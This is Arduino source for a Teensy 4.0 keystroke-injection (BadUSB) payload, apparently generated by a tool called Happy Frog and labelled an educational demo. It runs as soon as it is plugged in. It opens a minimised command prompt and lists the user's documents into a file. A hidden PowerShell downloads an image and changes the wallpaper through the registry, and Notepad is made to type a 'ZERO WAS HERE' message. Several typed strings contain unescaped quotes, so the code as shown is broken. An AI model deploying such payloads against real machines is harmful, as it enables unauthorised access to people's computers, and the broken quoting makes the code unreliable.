/*
Happy Frog - Teensy 4.0 Production Code
HID Emulation Script - Runs immediately on boot

Device: Teensy 4.0
Processor: ARM Cortex-M7
Framework: Arduino (Teensyduino)
Mode: Production (immediate execution)

⚠️ PRODUCTION MODE: This code runs immediately when device boots!
⚠️ Use only for authorized testing and educational purposes!
*/

#include <Keyboard.h>
#include <Mouse.h>
#include <USBHost_t36.h>  // Teensy 4.0 USB Host support

void setup() {
  // Initialize Teensy 4.0 for high-performance HID emulation
  Keyboard.begin();
  Mouse.begin();
  
  // Teensy 4.0: Fast startup with minimal delay
  delay(500);  // Optimized startup delay
}

void loop() {
  // Production mode - execute payload immediately
  executePayload();
  
  // Teensy 4.0: Efficient infinite loop for production
  while(true) {
    yield();  // Allow background tasks
  }
}

void executePayload() {
  // Generated Happy Frog payload for Teensy 4.0

  // Production code - executes immediately on device boot/plug-in
  // ATTACKMODE HID STORAGE detected - running payload automatically

  // Wait for system to recognize the device
  delay(2000);

  // Teensy 4.0 Command: # Happy Frog Script - Converted from Ducky Script

  // Teensy 4.0 Command: # Original source: payloads/ducky.txt

  // Teensy 4.0 Command: # Educational conversion - review all commands before execution

  // Teensy 4.0 Command: # BadUSB Demo: Open Terminal, Notepad, and type a message

  // Teensy 4.0 Command: ATTACKMODE HID STORAGE
  // ATTACKMODE: Configured for HID emulation (HID STORAGE)
  // Note: This device is configured as a HID keyboard/mouse
  // Configuration: HID STORAGE

  // Teensy 4.0 Command: DELAY 2000
  delay(2000);  // Teensy 4.0 optimized delay: 2000ms

  // Teensy 4.0 Command: # Open File Explorer

  // Teensy 4.0 Command: MOD e
  // Teensy 4.0 high-performance modifier combo
  Keyboard.press(KEY_LEFT_GUI);  // Press MOD
  Keyboard.press('E');  // Press e
  Keyboard.release('E');  // Release e
  Keyboard.release(KEY_LEFT_GUI);  // Release MOD

  // Teensy 4.0 Command: DELAY 1000
  delay(1000);  // Teensy 4.0 optimized delay: 1000ms

  // Teensy 4.0 Command: # Open Hidden Command Prompt

  // Teensy 4.0 Command: MOD r
  // Teensy 4.0 high-performance modifier combo
  Keyboard.press(KEY_LEFT_GUI);  // Press MOD
  Keyboard.press('R');  // Press r
  Keyboard.release('R');  // Release r
  Keyboard.release(KEY_LEFT_GUI);  // Release MOD

  // Teensy 4.0 Command: DELAY 500
  delay(500);  // Teensy 4.0 optimized delay: 500ms

  // Teensy 4.0 Command: STRING start /min cmd
  Keyboard.print("start /min cmd");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 1500
  delay(1500);  // Teensy 4.0 optimized delay: 1500ms

  // Teensy 4.0 Command: # Create "Demo" directory and files in one reliable command

  // Teensy 4.0 Command: STRING mkdir "%USERPROFILE%\Desktop\Demo" 2>nul && echo Demo file created at %date% %time% > "%USERPROFILE%\Desktop\Demo\README.txt" && echo This is a security demonstration file. > "%USERPROFILE%\Desktop\Demo\demo.txt" && echo If you can read this, your system was accessed via HID device. > "%USERPROFILE%\Desktop\Demo\warning.txt"
  Keyboard.print("mkdir "%USERPROFILE%\Desktop\Demo" 2>nul && echo Demo file created at %date% %time% > "%USERPROFILE%\Desktop\Demo\README.txt" && echo This is a security demonstration file. > "%USERPROFILE%\Desktop\Demo\demo.txt" && echo If you can read this, your system was accessed via HID device. > "%USERPROFILE%\Desktop\Demo\warning.txt"");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 1000
  delay(1000);  // Teensy 4.0 optimized delay: 1000ms

  // Teensy 4.0 Command: # Search for common document types (globally usable)

  // Teensy 4.0 Command: STRING for /r "%USERPROFILE%\Documents" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"
  Keyboard.print("for /r "%USERPROFILE%\Documents" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 1000
  delay(1000);  // Teensy 4.0 optimized delay: 1000ms

  // Teensy 4.0 Command: STRING for /r "%USERPROFILE%\Desktop" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"
  Keyboard.print("for /r "%USERPROFILE%\Desktop" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 1000
  delay(1000);  // Teensy 4.0 optimized delay: 1000ms

  // Teensy 4.0 Command: # Change wallpaper to hacker skull (stealth version)

  // Teensy 4.0 Command: STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\Demo\wallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\Demo\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"" -Wait
  Keyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\Demo\wallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\Demo\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"" -Wait");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 3000
  delay(3000);  // Teensy 4.0 optimized delay: 3000ms

  // Teensy 4.0 Command: # Open Notepad

  // Teensy 4.0 Command: MOD r
  // Teensy 4.0 high-performance modifier combo
  Keyboard.press(KEY_LEFT_GUI);  // Press MOD
  Keyboard.press('R');  // Press r
  Keyboard.release('R');  // Release r
  Keyboard.release(KEY_LEFT_GUI);  // Release MOD

  // Teensy 4.0 Command: DELAY 500
  delay(500);  // Teensy 4.0 optimized delay: 500ms

  // Teensy 4.0 Command: STRING notepad
  Keyboard.print("notepad");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 1500
  delay(1500);  // Teensy 4.0 optimized delay: 1500ms

  // Teensy 4.0 Command: # Type simple hacker message in Notepad (replacing ASCII art)

  // Teensy 4.0 Command: STRING ZERO WAS HERE
  Keyboard.print("ZERO WAS HERE");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 500
  delay(500);  // Teensy 4.0 optimized delay: 500ms

  // Teensy 4.0 Command: STRING never trust an open machine
  Keyboard.print("never trust an open machine");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: DELAY 500
  delay(500);  // Teensy 4.0 optimized delay: 500ms

  // Teensy 4.0 Command: STRING *** DEMO: Demo files have been created. This is a security demonstration. ***
  Keyboard.print("*** DEMO: Demo files have been created. This is a security demonstration. ***");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: STRING To protect your data, always lock your machine and use strong passwords.
  Keyboard.print("To protect your data, always lock your machine and use strong passwords.");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: STRING This was a demo. Next time, don't plug in random USB drives or borrow chargers!
  Keyboard.print("This was a demo. Next time, don't plug in random USB drives or borrow chargers!");  // Teensy 4.0 high-performance string input

  // Teensy 4.0 Command: ENTER
  Keyboard.press(KEY_RETURN);  // Teensy 4.0 key press: ENTER
  Keyboard.release(KEY_RETURN);  // Teensy 4.0 key release: ENTER

  // Teensy 4.0 Command: # Conversion completed by Happy Frog

  // Teensy 4.0 Command: # Remember: Use only for educational purposes and authorized testing!

  // End of Happy Frog payload
}

/*
End of Happy Frog Production Code for Teensy 4.0

Production Notes:
- This code runs immediately on device boot
- Optimized for high-performance HID emulation
- ARM Cortex-M7 processor enables complex automation
- Extended USB capabilities support advanced features

For more information, visit: https://github.com/ZeroDumb/happy-frog
*/